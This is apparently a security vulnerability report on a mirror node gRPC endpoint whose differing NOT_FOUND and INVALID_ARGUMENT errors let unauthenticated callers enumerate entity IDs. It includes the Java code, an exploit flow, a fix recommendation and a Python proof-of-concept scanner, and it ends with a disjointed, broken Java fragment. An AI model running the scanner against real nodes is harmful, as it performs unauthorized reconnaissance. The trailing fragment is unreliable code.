### Title
Entity Type Oracle via Differential gRPC Error Codes in `topicExists()` Enables Unprivileged Entity Enumeration

### Summary
The `topicExists()` method in `TopicMessageServiceImpl.java` returns two semantically distinct gRPC error codes to unauthenticated callers depending on whether a queried entity ID does not exist (`Status.NOT_FOUND`) or exists but is not a topic (`Status.INVALID_ARGUMENT`). Any unprivileged external user can exploit this differential response to enumerate the entire entity namespace, determining which numeric IDs exist and which correspond to topics versus other entity types (accounts, contracts, tokens, files, etc.), without any credentials or rate-limiting barrier.

### Finding Description

**Exact code path:**

`grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java`, `topicExists()`, lines 94–106:

```java
private Mono<?> topicExists(TopicMessageFilter filter) {
    var topicId = filter.getTopicId();
    return Mono.justOrEmpty(entityRepository.findById(topicId.getId()))
            .switchIfEmpty(
                    grpcProperties.isCheckTopicExists()
                            ? Mono.error(new EntityNotFoundException(topicId))   // path A
                            : Mono.just(Entity.builder()...build()))
            .filter(e -> e.getType() == EntityType.TOPIC)
            .switchIfEmpty(Mono.error(new IllegalArgumentException("Not a valid topic"))); // path B
}
```

**Root cause:** Two structurally different exceptions are thrown for two different database states:
- **Path A** (`EntityNotFoundException`) — entity ID is absent from the `entity` table entirely.
- **Path B** (`IllegalArgumentException`) — entity ID is present but its `type` column is not `TOPIC`.

`ProtoUtil.toStatusRuntimeException()` (lines 47–52) maps these to **different gRPC status codes** returned over the wire:

```java
} else if (t instanceof ConstraintViolationException
        || t instanceof IllegalArgumentException   // → INVALID_ARGUMENT
        || t instanceof InvalidEntityException) {
    return clientError(t, Status.INVALID_ARGUMENT, t.getMessage());
} else if (t instanceof EntityNotFoundException) { // → NOT_FOUND
    return clientError(t, Status.NOT_FOUND, t.getMessage());
```

The failed assumption is that both "not found" and "wrong type" are equivalent negative outcomes from the caller's perspective. They are not — they leak orthogonal facts about the entity table.

**Exploit flow:**

1. Attacker sends `subscribeTopic` gRPC calls with sequential `topicId` values (e.g., `0.0.1`, `0.0.2`, … `0.0.N`). No authentication is required.
2. Response oracle:
   - `Status.NOT_FOUND` + `"0.0.X does not exist"` → ID X is absent from the entity table.
   - `Status.INVALID_ARGUMENT` + `"Not a valid topic"` → ID X **exists** in the entity table but is typed as ACCOUNT, CONTRACT, TOKEN, FILE, etc.
   - Successful subscription stream → ID X is a valid TOPIC.
3. Attacker builds a complete map of: which IDs exist, which are topics, and which are other entity types.

**Why existing checks are insufficient:**

- `checkTopicExists = true` (default) only controls whether path A fires for missing entities. It has no effect on path B, which always fires for existing non-topic entities.
- `checkTopicExists = false` suppresses path A but still exposes path B — the oracle remains intact for the more valuable case (distinguishing existing non-topic entities from topics).
- There is no authentication gate on the gRPC `subscribeTopic` endpoint.
- No rate limiting is enforced at the service layer for this check.

### Impact Explanation

An attacker obtains a full enumeration of the mirror node's entity table: which numeric IDs are allocated, and their coarse type classification (topic vs. non-topic). For the "tampering" threat model, this reconnaissance directly enables targeting: the attacker learns exactly which topic IDs carry live transaction streams and can submit crafted `ConsensusSubmitMessage` transactions to those specific topics on the Hedera network, or monitor them for sensitive application data. Topics used for governance, DeFi settlement, or supply-chain provenance are identifiable and become actionable targets. The information is also useful for correlating entity IDs across other mirror node APIs to build richer attack profiles.

### Likelihood Explanation

Preconditions are minimal: a network connection to the gRPC port (default 5600) and a standard gRPC client. No account, key, or token is required. The scan is fully automatable — iterating 64-bit entity IDs and classifying responses takes seconds per batch. The endpoint is publicly exposed by design (mirror nodes are public infrastructure). The attack is repeatable and leaves no persistent state on the server.

### Recommendation

Normalize error responses so that both "entity not found" and "entity exists but is not a topic" return the same gRPC status code and an identical, non-distinguishing message (e.g., `Status.NOT_FOUND` with `"Topic not found"`). The caller must never be able to infer whether the entity row exists from the error. Specifically:

- In `topicExists()`, replace the two-branch `switchIfEmpty` + `.filter` + second `switchIfEmpty` chain with a single lookup that returns a unified `NOT_FOUND` error regardless of whether the row is absent or present with the wrong type.
- Do not expose the entity ID in the error message (current `EntityNotFoundException` formats `"0.0.X does not exist"`, confirming the ID was looked up).
- Consider adding per-IP or per-connection rate limiting on `subscribeTopic` to slow automated enumeration even if the oracle is closed.

### Proof of Concept

```python
import grpc
from com.hederahashgraph.api.proto.java import ConsensusService_pb2_grpc, mirror_pb2

channel = grpc.insecure_channel("mirror-node-host:5600")
stub = ConsensusService_pb2_grpc.ConsensusServiceStub(channel)

results = {}
for entity_num in range(1, 10001):
    request = mirror_pb2.ConsensusTopicQuery(
        topicID=mirror_pb2.TopicID(topicNum=entity_num)
    )
    try:
        for _ in stub.subscribeTopic(request, timeout=1):
            results[entity_num] = "TOPIC (active)"
            break
    except grpc.RpcError as e:
        if e.code() == grpc.StatusCode.NOT_FOUND:
            results[entity_num] = "ABSENT"          # entity does not exist
        elif e.code() == grpc.StatusCode.INVALID_ARGUMENT:
            results[entity_num] = "EXISTS (non-topic)"  # entity exists, wrong type
        else:
            results[entity_num] = f"OTHER: {e.code()}"

# Output: complete map of entity IDs → existence + type classification
for num, status in results.items():
    print(f"0.0.{num}: {status}")
```

        if (Exceptions.isOverflow(t)) {

            return serverError(t, Status.RESOURCE_EXHAUSTED, DB_ERROR);

            return serverError(t, Status.UNAVAILABLE, DB_ERROR);
        } else {
